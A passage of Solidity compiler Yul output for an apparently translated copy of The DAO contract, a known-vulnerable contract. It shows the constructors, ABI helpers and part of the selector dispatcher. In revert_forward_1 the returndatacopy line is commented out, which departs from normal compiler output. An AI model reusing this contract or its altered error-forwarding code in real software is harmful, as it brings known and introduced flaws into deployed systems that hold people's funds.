                        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                        mstore(4, 0x41)
                        revert(0, 0x24)
                    }

                    function finalize_allocation(memPtr, size) {
                        let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))
                        // protect against overflow
                        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }
                        mstore(64, newFreePtr)
                    }

                    function allocate_memory(size) -> memPtr {
                        memPtr := allocate_unbounded()
                        finalize_allocation(memPtr, size)
                    }

                    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {
                        revert(0, 0)
                    }

                    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {
                        revert(0, 0)
                    }

                    function cleanup_t_uint160(value) -> cleaned {
                        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                    }

                    function cleanup_t_address(value) -> cleaned {
                        cleaned := cleanup_t_uint160(value)
                    }

                    function validator_revert_t_address(value) {
                        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }
                    }

                    function abi_decode_t_address_fromMemory(offset, end) -> value {
                        value := mload(offset)
                        validator_revert_t_address(value)
                    }

                    function cleanup_t_contract$_DAO_Creator_$3051(value) -> cleaned {
                        cleaned := cleanup_t_address(value)
                    }

                    function validator_revert_t_contract$_DAO_Creator_$3051(value) {
                        if iszero(eq(value, cleanup_t_contract$_DAO_Creator_$3051(value))) { revert(0, 0) }
                    }

                    function abi_decode_t_contract$_DAO_Creator_$3051_fromMemory(offset, end) -> value {
                        value := mload(offset)
                        validator_revert_t_contract$_DAO_Creator_$3051(value)
                    }

                    function cleanup_t_uint256(value) -> cleaned {
                        cleaned := value
                    }

                    function validator_revert_t_uint256(value) {
                        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }
                    }

                    function abi_decode_t_uint256_fromMemory(offset, end) -> value {
                        value := mload(offset)
                        validator_revert_t_uint256(value)
                    }

                    function abi_decode_tuple_t_addresst_contract$_DAO_Creator_$3051t_uint256t_uint256t_uint256t_address_fromMemory(headStart, dataEnd) -> value0, value1, value2, value3, value4, value5 {
                        if slt(sub(dataEnd, headStart), 192) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                        {

                            let offset := 0

                            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)
                        }

                        {

                            let offset := 32

                            value1 := abi_decode_t_contract$_DAO_Creator_$3051_fromMemory(add(headStart, offset), dataEnd)
                        }

                        {

                            let offset := 64

                            value2 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)
                        }

                        {

                            let offset := 96

                            value3 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)
                        }

                        {

                            let offset := 128

                            value4 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)
                        }

                        {

                            let offset := 160

                            value5 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)
                        }

                    }

                    function copy_arguments_for_constructor_1172_object_DAO_3021() -> ret_param_0, ret_param_1, ret_param_2, ret_param_3, ret_param_4, ret_param_5 {
                        let programSize := datasize("DAO_3021")
                        let argSize := sub(codesize(), programSize)

                        let memoryDataOffset := allocate_memory(argSize)
                        codecopy(memoryDataOffset, programSize, argSize)

                        ret_param_0, ret_param_1, ret_param_2, ret_param_3, ret_param_4, ret_param_5 := abi_decode_tuple_t_addresst_contract$_DAO_Creator_$3051t_uint256t_uint256t_uint256t_address_fromMemory(memoryDataOffset, add(memoryDataOffset, argSize))
                    }

                    function shift_left_0(value) -> newValue {
                        newValue :=

                        shl(0, value)

                    }

                    function update_byte_slice_20_shift_0(value, toInsert) -> result {
                        let mask := 0xffffffffffffffffffffffffffffffffffffffff
                        toInsert := shift_left_0(toInsert)
                        value := and(value, not(mask))
                        result := or(value, and(toInsert, mask))
                    }

                    function identity(value) -> ret {
                        ret := value
                    }

                    function convert_t_uint160_to_t_uint160(value) -> converted {
                        converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))
                    }

                    function convert_t_uint160_to_t_address(value) -> converted {
                        converted := convert_t_uint160_to_t_uint160(value)
                    }

                    function convert_t_address_to_t_address(value) -> converted {
                        converted := convert_t_uint160_to_t_address(value)
                    }

                    function prepare_store_t_address(value) -> ret {
                        ret := value
                    }

                    function update_storage_value_offset_0_t_address_to_t_address(slot, value_0) {
                        let convertedValue_0 := convert_t_address_to_t_address(value_0)
                        sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_address(convertedValue_0)))
                    }

                    function convert_t_uint160_to_t_contract$_DAO_Creator_$3051(value) -> converted {
                        converted := convert_t_uint160_to_t_uint160(value)
                    }

                    function convert_t_contract$_DAO_Creator_$3051_to_t_contract$_DAO_Creator_$3051(value) -> converted {
                        converted := convert_t_uint160_to_t_contract$_DAO_Creator_$3051(value)
                    }

                    function prepare_store_t_contract$_DAO_Creator_$3051(value) -> ret {
                        ret := value
                    }

                    function update_storage_value_offset_0_t_contract$_DAO_Creator_$3051_to_t_contract$_DAO_Creator_$3051(slot, value_0) {
                        let convertedValue_0 := convert_t_contract$_DAO_Creator_$3051_to_t_contract$_DAO_Creator_$3051(value_0)
                        sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_contract$_DAO_Creator_$3051(convertedValue_0)))
                    }

                    function update_byte_slice_32_shift_0(value, toInsert) -> result {
                        let mask := 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
                        toInsert := shift_left_0(toInsert)
                        value := and(value, not(mask))
                        result := or(value, and(toInsert, mask))
                    }

                    function convert_t_uint256_to_t_uint256(value) -> converted {
                        converted := cleanup_t_uint256(identity(cleanup_t_uint256(value)))
                    }

                    function prepare_store_t_uint256(value) -> ret {
                        ret := value
                    }

                    function update_storage_value_offset_0_t_uint256_to_t_uint256(slot, value_0) {
                        let convertedValue_0 := convert_t_uint256_to_t_uint256(value_0)
                        sstore(slot, update_byte_slice_32_shift_0(sload(slot), prepare_store_t_uint256(convertedValue_0)))
                    }

                    function convert_t_contract$_DAO_$3021_to_t_address(value) -> converted {
                        converted := convert_t_uint160_to_t_address(value)
                    }

                    function abi_encode_t_address_to_t_address_fromStack(value, pos) {
                        mstore(pos, cleanup_t_address(value))
                    }

                    function cleanup_t_bool(value) -> cleaned {
                        cleaned := iszero(iszero(value))
                    }

                    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {
                        mstore(pos, cleanup_t_bool(value))
                    }

                    function abi_encode_tuple_t_address_t_bool__to_t_address_t_bool__fromStack(headStart , value0, value1) -> tail {
                        tail := add(headStart, 64)

                        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                        abi_encode_t_bool_to_t_bool_fromStack(value1,  add(headStart, 32))

                    }

                    function revert_forward_1() {
                        let pos := allocate_unbounded()
                        //returndatacopy(pos, 0, returndatasize())
                        revert(pos, returndatasize())
                    }

                    function convert_t_uint160_to_t_contract$_ManagedAccount_$375(value) -> converted {
                        converted := convert_t_uint160_to_t_uint160(value)
                    }

                    function convert_t_contract$_ManagedAccount_$375_to_t_contract$_ManagedAccount_$375(value) -> converted {
                        converted := convert_t_uint160_to_t_contract$_ManagedAccount_$375(value)
                    }

                    function prepare_store_t_contract$_ManagedAccount_$375(value) -> ret {
                        ret := value
                    }

                    function update_storage_value_offset_0_t_contract$_ManagedAccount_$375_to_t_contract$_ManagedAccount_$375(slot, value_0) {
                        let convertedValue_0 := convert_t_contract$_ManagedAccount_$375_to_t_contract$_ManagedAccount_$375(value_0)
                        sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_contract$_ManagedAccount_$375(convertedValue_0)))
                    }

                    function shift_right_0_unsigned(value) -> newValue {
                        newValue :=

                        shr(0, value)

                    }

                    function cleanup_from_storage_t_contract$_ManagedAccount_$375(value) -> cleaned {
                        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                    }

                    function extract_from_storage_value_offset_0_t_contract$_ManagedAccount_$375(slot_value) -> value {
                        value := cleanup_from_storage_t_contract$_ManagedAccount_$375(shift_right_0_unsigned(slot_value))
                    }

                    function read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(slot) -> value {
                        value := extract_from_storage_value_offset_0_t_contract$_ManagedAccount_$375(sload(slot))

                    }

                    function convert_t_contract$_ManagedAccount_$375_to_t_address(value) -> converted {
                        converted := convert_t_uint160_to_t_address(value)
                    }

                    function cleanup_t_rational_0_by_1(value) -> cleaned {
                        cleaned := value
                    }

                    function convert_t_rational_0_by_1_to_t_uint160(value) -> converted {
                        converted := cleanup_t_uint160(identity(cleanup_t_rational_0_by_1(value)))
                    }

                    function convert_t_rational_0_by_1_to_t_address(value) -> converted {
                        converted := convert_t_rational_0_by_1_to_t_uint160(value)
                    }

                    function panic_error_0x01() {
                        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                        mstore(4, 0x01)
                        revert(0, 0x24)
                    }

                    function assert_helper(condition) {
                        if iszero(condition) { panic_error_0x01() }
                    }

                    function cleanup_t_rational_5_by_1(value) -> cleaned {
                        cleaned := value
                    }

                    function convert_t_rational_5_by_1_to_t_uint256(value) -> converted {
                        converted := cleanup_t_uint256(identity(cleanup_t_rational_5_by_1(value)))
                    }

                    function convert_array_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_to_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(value) -> converted  {
                        converted := value

                    }

                    function array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(value) -> length {

                        length := sload(value)

                    }

                    function panic_error_0x32() {
                        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                        mstore(4, 0x32)
                        revert(0, 0x24)
                    }

                    function array_dataslot_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(ptr) -> data {
                        data := ptr
                        mstore(0, ptr)
                        data := keccak256(0, 0x20)

                    }

                    function array_dataslot_t_bytes_storage_ptr(ptr) -> data {
                        data := ptr

                        mstore(0, ptr)
                        data := keccak256(0, 0x20)

                    }

                    function long_byte_array_index_access_no_checks(array, index) -> slot, offset {

                        offset := sub(31, mod(index, 0x20))
                        let dataArea := array_dataslot_t_bytes_storage_ptr(array)
                        slot := add(dataArea, div(index, 0x20))

                    }

                    function storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array, index) -> slot, offset {
                        let arrayLength := array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array)
                        if iszero(lt(index, arrayLength)) { panic_error_0x32() }

                        let dataArea := array_dataslot_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array)
                        
                        slot := add(dataArea, mul(index, 14))
                        offset := 0

                    }

                    function array_push_zero_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array) -> slot, offset {

                        let oldLen := array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array)
                        if iszero(lt(oldLen, 18446744073709551616)) { panic_error_0x41() }
                        sstore(array, add(oldLen, 1))

                        slot, offset := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(array, oldLen)
                    }
                    function mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(slot , key) -> dataSlot {
                        mstore(0, convert_t_address_to_t_address(key))
                        mstore(0x20, slot)
                        dataSlot := keccak256(0, 0x40)
                    }

                    function update_byte_slice_1_shift_0(value, toInsert) -> result {
                        let mask := 255
                        toInsert := shift_left_0(toInsert)
                        value := and(value, not(mask))
                        result := or(value, and(toInsert, mask))
                    }

                    function convert_t_bool_to_t_bool(value) -> converted {
                        converted := cleanup_t_bool(value)
                    }

                    function prepare_store_t_bool(value) -> ret {
                        ret := value
                    }

                    function update_storage_value_offset_0_t_bool_to_t_bool(slot, value_0) {
                        let convertedValue_0 := convert_t_bool_to_t_bool(value_0)
                        sstore(slot, update_byte_slice_1_shift_0(sload(slot), prepare_store_t_bool(convertedValue_0)))
                    }

                    function cleanup_from_storage_t_address(value) -> cleaned {
                        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                    }

                    function extract_from_storage_value_offset_0_t_address(slot_value) -> value {
                        value := cleanup_from_storage_t_address(shift_right_0_unsigned(slot_value))
                    }

                    function read_from_storage_split_offset_0_t_address(slot) -> value {
                        value := extract_from_storage_value_offset_0_t_address(sload(slot))

                    }

                    /// @ast-id 1172
                    /// @src 0:29671:30586  "constructor(..."
                    function constructor_DAO_3021(var__curator_1059, var__daoCreator_1062_address, var__proposalDeposit_1064, var__minTokensToCreate_1066, var__closingTime_1068, var__privateCreation_1070) {
                        /// @src 0:29887:29905  "_minTokensToCreate"
                        let _8 := var__minTokensToCreate_1066
                        let expr_1073 := _8
                        let _9 := expr_1073
                        /// @src 0:29907:29919  "_closingTime"
                        let _10 := var__closingTime_1068
                        let expr_1074 := _10
                        let _11 := expr_1074
                        /// @src 0:29921:29937  "_privateCreation"
                        let _12 := var__privateCreation_1070
                        let expr_1075 := _12
                        let _13 := expr_1075

                        /// @src 0:29671:30586  "constructor(..."
                        constructor_TokenCreation_695(_9, _11, _13)

                        /// @src 0:29960:29968  "_curator"
                        let _14 := var__curator_1059
                        let expr_1079 := _14
                        /// @src 0:29950:29968  "curator = _curator"
                        update_storage_value_offset_0_t_address_to_t_address(0x0b, expr_1079)
                        let expr_1080 := expr_1079
                        /// @src 0:29991:30002  "_daoCreator"
                        let _15_address := var__daoCreator_1062_address
                        let expr_1083_address := _15_address
                        /// @src 0:29978:30002  "daoCreator = _daoCreator"
                        update_storage_value_offset_0_t_contract$_DAO_Creator_$3051_to_t_contract$_DAO_Creator_$3051(0x16, expr_1083_address)
                        let expr_1084_address := expr_1083_address
                        /// @src 0:30030:30046  "_proposalDeposit"
                        let _16 := var__proposalDeposit_1064
                        let expr_1087 := _16
                        /// @src 0:30012:30046  "proposalDeposit = _proposalDeposit"
                        update_storage_value_offset_0_t_uint256_to_t_uint256(0x14, expr_1087)
                        let expr_1088 := expr_1087
                        /// @src 0:30099:30103  "this"
                        let expr_1096_address := address()
                        /// @src 0:30091:30104  "address(this)"
                        let expr_1097 := convert_t_contract$_DAO_$3021_to_t_address(expr_1096_address)
                        /// @src 0:30106:30111  "false"
                        let expr_1098 := 0x00
                        /// @src 0:30072:30112  "new ManagedAccount(address(this), false)"
                        let _17 := allocate_unbounded()
                        let _18 := add(_17, datasize("ManagedAccount_375"))
                        if or(gt(_18, 0xffffffffffffffff), lt(_18, _17)) { panic_error_0x41() }
                        datacopy(_17, dataoffset("ManagedAccount_375"), datasize("ManagedAccount_375"))
                        _18 := abi_encode_tuple_t_address_t_bool__to_t_address_t_bool__fromStack(_18, expr_1097, expr_1098)

                        let expr_1099_address := create(0, _17, sub(_18, _17))

                        if iszero(expr_1099_address) { revert_forward_1() }

                        /// @src 0:30056:30112  "rewardAccount = new ManagedAccount(address(this), false)"
                        update_storage_value_offset_0_t_contract$_ManagedAccount_$375_to_t_contract$_ManagedAccount_$375(0x0f, expr_1099_address)
                        let expr_1100_address := expr_1099_address
                        /// @src 0:30168:30172  "this"
                        let expr_1108_address := address()
                        /// @src 0:30160:30173  "address(this)"
                        let expr_1109 := convert_t_contract$_DAO_$3021_to_t_address(expr_1108_address)
                        /// @src 0:30175:30180  "false"
                        let expr_1110 := 0x00
                        /// @src 0:30141:30181  "new ManagedAccount(address(this), false)"
                        let _19 := allocate_unbounded()
                        let _20 := add(_19, datasize("ManagedAccount_375"))
                        if or(gt(_20, 0xffffffffffffffff), lt(_20, _19)) { panic_error_0x41() }
                        datacopy(_19, dataoffset("ManagedAccount_375"), datasize("ManagedAccount_375"))
                        _20 := abi_encode_tuple_t_address_t_bool__to_t_address_t_bool__fromStack(_20, expr_1109, expr_1110)

                        let expr_1111_address := create(0, _19, sub(_20, _19))

                        if iszero(expr_1111_address) { revert_forward_1() }

                        /// @src 0:30122:30181  "DAOrewardAccount = new ManagedAccount(address(this), false)"
                        update_storage_value_offset_0_t_contract$_ManagedAccount_$375_to_t_contract$_ManagedAccount_$375(0x10, expr_1111_address)
                        let expr_1112_address := expr_1111_address
                        /// @src 0:30208:30221  "rewardAccount"
                        let _21_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x0f)
                        let expr_1117_address := _21_address
                        /// @src 0:30200:30222  "address(rewardAccount)"
                        let expr_1118 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_1117_address)
                        /// @src 0:30234:30235  "0"
                        let expr_1121 := 0x00
                        /// @src 0:30226:30236  "address(0)"
                        let expr_1122 := convert_t_rational_0_by_1_to_t_address(expr_1121)
                        /// @src 0:30200:30236  "address(rewardAccount) == address(0)"
                        let expr_1123 := eq(cleanup_t_address(expr_1118), cleanup_t_address(expr_1122))
                        /// @src 0:30199:30237  "(address(rewardAccount) == address(0))"
                        let expr_1124 := expr_1123
                        /// @src 0:30198:30237  "!(address(rewardAccount) == address(0))"
                        let expr_1125 := cleanup_t_bool(iszero(expr_1124))
                        /// @src 0:30191:30238  "assert(!(address(rewardAccount) == address(0)))"
                        assert_helper(expr_1125)
                        /// @src 0:30265:30281  "DAOrewardAccount"
                        let _22_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x10)
                        let expr_1131_address := _22_address
                        /// @src 0:30257:30282  "address(DAOrewardAccount)"
                        let expr_1132 := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_1131_address)
                        /// @src 0:30294:30295  "0"
                        let expr_1135 := 0x00
                        /// @src 0:30286:30296  "address(0)"
                        let expr_1136 := convert_t_rational_0_by_1_to_t_address(expr_1135)
                        /// @src 0:30257:30296  "address(DAOrewardAccount) == address(0)"
                        let expr_1137 := eq(cleanup_t_address(expr_1132), cleanup_t_address(expr_1136))
                        /// @src 0:30256:30297  "(address(DAOrewardAccount) == address(0))"
                        let expr_1138 := expr_1137
                        /// @src 0:30255:30297  "!(address(DAOrewardAccount) == address(0))"
                        let expr_1139 := cleanup_t_bool(iszero(expr_1138))
                        /// @src 0:30248:30298  "assert(!(address(DAOrewardAccount) == address(0)))"
                        assert_helper(expr_1139)
                        /// @src 0:30331:30346  "block.timestamp"
                        let expr_1144 := timestamp()
                        /// @src 0:30308:30346  "lastTimeMinQuorumMet = block.timestamp"
                        update_storage_value_offset_0_t_uint256_to_t_uint256(0x0a, expr_1144)
                        let expr_1145 := expr_1144
                        /// @src 0:30375:30376  "5"
                        let expr_1148 := 0x05
                        /// @src 0:30356:30376  "minQuorumDivisor = 5"
                        let _23 := convert_t_rational_5_by_1_to_t_uint256(expr_1148)
                        update_storage_value_offset_0_t_uint256_to_t_uint256(0x09, _23)
                        let expr_1149 := _23
                        /// @src 0:30420:30429  "proposals"
                        let _24_slot := 0x08
                        let expr_1151_slot := _24_slot
                        /// @src 0:30420:30434  "proposals.push"
                        let expr_1153_self_slot := convert_array_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_to_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(expr_1151_slot)
                        /// @src 0:30420:30436  "proposals.push()"
                        let _25, _26 := array_push_zero_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(expr_1153_self_slot)
                        let _27_slot := _25
                        let expr_1154_slot := _27_slot
                        /// @src 0:30532:30536  "true"
                        let expr_1162 := 0x01
                        /// @src 0:30497:30514  "allowedRecipients"
                        let _28_slot := 0x0c
                        let expr_1156_slot := _28_slot
                        /// @src 0:30523:30527  "this"
                        let expr_1159_address := address()
                        /// @src 0:30515:30528  "address(this)"
                        let expr_1160 := convert_t_contract$_DAO_$3021_to_t_address(expr_1159_address)
                        /// @src 0:30497:30529  "allowedRecipients[address(this)]"
                        let _29 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_1156_slot,expr_1160)
                        /// @src 0:30497:30536  "allowedRecipients[address(this)] = true"
                        update_storage_value_offset_0_t_bool_to_t_bool(_29, expr_1162)
                        let expr_1163 := expr_1162
                        /// @src 0:30575:30579  "true"
                        let expr_1168 := 0x01
                        /// @src 0:30546:30563  "allowedRecipients"
                        let _30_slot := 0x0c
                        let expr_1165_slot := _30_slot
                        /// @src 0:30564:30571  "curator"
                        let _31 := read_from_storage_split_offset_0_t_address(0x0b)
                        let expr_1166 := _31
                        /// @src 0:30546:30572  "allowedRecipients[curator]"
                        let _32 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_1165_slot,expr_1166)
                        /// @src 0:30546:30579  "allowedRecipients[curator] = true"
                        update_storage_value_offset_0_t_bool_to_t_bool(_32, expr_1168)
                        let expr_1169 := expr_1168

                    }
                    /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                    function shift_left_8(value) -> newValue {
                        newValue :=

                        shl(8, value)

                    }

                    function update_byte_slice_20_shift_1(value, toInsert) -> result {
                        let mask := 0xffffffffffffffffffffffffffffffffffffffff00
                        toInsert := shift_left_8(toInsert)
                        value := and(value, not(mask))
                        result := or(value, and(toInsert, mask))
                    }

                    function update_storage_value_offset_1_t_address_to_t_address(slot, value_0) {
                        let convertedValue_0 := convert_t_address_to_t_address(value_0)
                        sstore(slot, update_byte_slice_20_shift_1(sload(slot), prepare_store_t_address(convertedValue_0)))
                    }

                    function convert_t_contract$_TokenCreation_$695_to_t_address(value) -> converted {
                        converted := convert_t_uint160_to_t_address(value)
                    }

                    /// @ast-id 463
                    /// @src 0:10944:11251  "constructor(..."
                    function constructor_TokenCreation_695(var__minTokensToCreate_431, var__closingTime_433, var__privateCreation_435) {

                        /// @src 0:10944:11251  "constructor(..."
                        constructor_DAOInterface_1037()

                        /// @src 0:11076:11088  "_closingTime"
                        let _33 := var__closingTime_433
                        let expr_439 := _33
                        /// @src 0:11062:11088  "closingTime = _closingTime"
                        update_storage_value_offset_0_t_uint256_to_t_uint256(0x00, expr_439)
                        let expr_440 := expr_439
                        /// @src 0:11118:11136  "_minTokensToCreate"
                        let _34 := var__minTokensToCreate_431
                        let expr_443 := _34
                        /// @src 0:11098:11136  "minTokensToCreate = _minTokensToCreate"
                        update_storage_value_offset_0_t_uint256_to_t_uint256(0x01, expr_443)
                        let expr_444 := expr_443
                        /// @src 0:11164:11180  "_privateCreation"
                        let _35 := var__privateCreation_435
                        let expr_447 := _35
                        /// @src 0:11146:11180  "privateCreation = _privateCreation"
                        update_storage_value_offset_1_t_address_to_t_address(0x02, expr_447)
                        let expr_448 := expr_447
                        /// @src 0:11232:11236  "this"
                        let expr_456_address := address()
                        /// @src 0:11224:11237  "address(this)"
                        let expr_457 := convert_t_contract$_TokenCreation_$695_to_t_address(expr_456_address)
                        /// @src 0:11239:11243  "true"
                        let expr_458 := 0x01
                        /// @src 0:11205:11244  "new ManagedAccount(address(this), true)"
                        let _36 := allocate_unbounded()
                        let _37 := add(_36, datasize("ManagedAccount_375"))
                        if or(gt(_37, 0xffffffffffffffff), lt(_37, _36)) { panic_error_0x41() }
                        datacopy(_36, dataoffset("ManagedAccount_375"), datasize("ManagedAccount_375"))
                        _37 := abi_encode_tuple_t_address_t_bool__to_t_address_t_bool__fromStack(_37, expr_457, expr_458)

                        let expr_459_address := create(0, _36, sub(_37, _36))

                        if iszero(expr_459_address) { revert_forward_1() }

                        /// @src 0:11190:11244  "extraBalance = new ManagedAccount(address(this), true)"
                        update_storage_value_offset_0_t_contract$_ManagedAccount_$375_to_t_contract$_ManagedAccount_$375(0x03, expr_459_address)
                        let expr_460_address := expr_459_address

                    }
                    /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                    /// @src 0:14237:29402  "abstract contract DAOInterface is Token{..."
                    function constructor_DAOInterface_1037() {

                        /// @src 0:14237:29402  "abstract contract DAOInterface is Token{..."
                        constructor_Token_269()

                    }
                    /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                    /// @src 0:3635:5265  "abstract contract Token is TokenInterface {..."
                    function constructor_Token_269() {

                        /// @src 0:3635:5265  "abstract contract Token is TokenInterface {..."
                        constructor_TokenInterface_81()

                    }
                    /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                    /// @src 0:1446:3632  "abstract contract TokenInterface {..."
                    function constructor_TokenInterface_81() {

                        /// @src 0:1446:3632  "abstract contract TokenInterface {..."
                        constructor_TokenCreationInterface_425()

                    }
                    /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                    /// @src 0:8518:10870  "abstract contract TokenCreationInterface {..."
                    function constructor_TokenCreationInterface_425() {

                        /// @src 0:8518:10870  "abstract contract TokenCreationInterface {..."

                    }
                    /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                }
                /// @use-src 0:"DAO_from_etherscan_translated.sol"
                object "DAO_3021_deployed" {
                    code {
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."
                        mstore(64, memoryguard(128))

                        
                        if iszero(lt(calldatasize(), 4))
                        {
                            let selector := shift_right_224_unsigned(calldataload(0))
                            switch selector

                            case 0x013cf08b
                            {
                                // proposals(uint256)
                                external_fun_proposals_722()
                            }

                            case 0x095ea7b3
                            {
                                // approve(address,uint256)

                                external_fun_approve_251()
                            }

                            case 0x0c3b7b96
                            {
                                // minTokensToCreate()
                                external_fun_minTokensToCreate_379()
                            }

                            case 0x0e708203
                            {
                                // rewardAccount()

                                external_fun_rewardAccount_741()
                            }

                            case 0x149acf9a
                            {
                                // daoCreator()

                                external_fun_daoCreator_763()
                            }

                            case 0x18160ddd
                            {
                                // totalSupply()

                                external_fun_totalSupply_14()
                            }

                            case 0x1f2dc5ef
                            {
                                // divisor()

                                external_fun_divisor_694()
                            }

                            case 0x21b5b8dd
                            {
                                // extraBalance()

                                external_fun_extraBalance_386()
                            }

                            case 0x237e9492
                            {
                                // executeProposal(uint256,bytes)

                                external_fun_executeProposal_1911()
                            }

                            case 0x23b872dd
                            {
                                // transferFrom(address,address,uint256)

                                external_fun_transferFrom_222()
                            }

                            case 0x2632bf20
                            {
                                // unblockMe()

                                external_fun_unblockMe_3020()
                            }

                            case 0x34145808
                            {
                                // totalRewardToken()

                                external_fun_totalRewardToken_738()
                            }

                            case 0x39d1f908
                            {
                                // actualBalance()

                                external_fun_actualBalance_2833()
                            }

                            case 0x4b6753bc
                            {
                                // closingTime()

                                external_fun_closingTime_377()
                            }

                            case 0x4df6d6cc
                            {
                                // allowedRecipients(address)

                                external_fun_allowedRecipients_732()
                            }

                            case 0x4e10c3ee
                            {
                                // transferWithoutReward(address,uint256)

                                external_fun_transferWithoutReward_2599()
                            }

                            case 0x590e1ae3
                            {
                                // refund()

                                external_fun_refund_651()
                            }

                            case 0x612e45a3
                            {
                                // newProposal(address,uint256,string,bytes,uint256,bool)

                                external_fun_newProposal_1450()
                            }

                            case 0x643f7cdd
                            {
                                // DAOpaidOut(address)

                                external_fun_DAOpaidOut_748()
                            }

                            case 0x674ed066
                            {
                                // minQuorumDivisor()

                                external_fun_minQuorumDivisor_724()
                            }

                            case 0x6837ff1e
                            {
                                // newContract(address)

                                external_fun_newContract_2367()
                            }

                            case 0x70a08231
                            {
                                // balanceOf(address)

                                external_fun_balanceOf_109()
                            }

                            case 0x749f9889
                            {
                                // changeAllowedRecipients(address,bool)

                                external_fun_changeAllowedRecipients_2789()
                            }

                            case 0x76afdf24
                            {
                                // transfer_2(address,uint256)

                                external_fun_transfer_2_2578()
                            }

                            case 0x78524b2e
                            {
                                // halveMinQuorum()

                                external_fun_halveMinQuorum_2908()
                            }

                            case 0x81f03fcb
                            {
                                // paidOut(address)

                                external_fun_paidOut_752()
                            }

                            case 0x82661dc4
                            {
                                // splitDAO(uint256,address)
                                external_fun_splitDAO_2289()
                            }

                            case 0x82bf6464
                            {
                                // DAOrewardAccount()

                                external_fun_DAOrewardAccount_744()
                            }

                            case 0x8b15a605
                            {
                                // proposalDeposit()

                                external_fun_proposalDeposit_758()
                            }

                            case 0x8d7af473
                            {
                                // numberOfProposals()

                                external_fun_numberOfProposals_2944()
                            }

                            case 0x96d7f3f5
                            {
                                // lastTimeMinQuorumMet()

                                external_fun_lastTimeMinQuorumMet_726()
                            }

                            case 0xa1da2fb9
                            {
                                // retrieveDAOReward(bool)

                                external_fun_retrieveDAOReward_2461()
                            }

                            case 0xa3912ec8
                            {
                                // receiveEther()

                                external_fun_receiveEther_1219()
                            }

                            case 0xa9059cbb
                            {
                                // transfer(address,uint256)

                                external_fun_transfer_157()
                            }

                            case 0xb7bc2c84
                            {
                                // isFueled()

                                external_fun_isFueled_381()
                            }

                            case 0xbaac5300
                            {
                                // createTokenProxy(address)

                                external_fun_createTokenProxy_569()
                            }

                            case 0xbe7c29c1
                            {
                                // getNewDAOAddress(uint256)

                                external_fun_getNewDAOAddress_2964()
                            }

                            case 0xc9d27afe
                            {
                                // vote(uint256,bool)

                                external_fun_vote_1605()
                            }

                            case 0xcc9ae3f6
                            {
                                // getMyReward()

                                external_fun_getMyReward_2473()
                            }

                            case 0xcdef91d0
                            {
                                // rewardToken(address)

                                external_fun_rewardToken_736()
                            }

                            case 0xdbde1988
                            {
                                // transferFromWithoutReward(address,address,uint256)

                                external_fun_transferFromWithoutReward_2672()
                            }

                            case 0xdd62ed3e
                            {
                                // allowance(address,address)

                                external_fun_allowance_268()
                            }

                            case 0xe33734fd
                            {
                                // changeProposalDeposit(uint256)

                                external_fun_changeProposalDeposit_2758()
                            }

                            case 0xe5962195
                            {
                                // blocked(address)

                                external_fun_blocked_756()
                            }

                            case 0xe66f53b7
                            {
                                // curator()

                                external_fun_curator_728()
                            }

                            case 0xea5b90d1
                            {
                                // transferFrom_2(address,address,uint256)

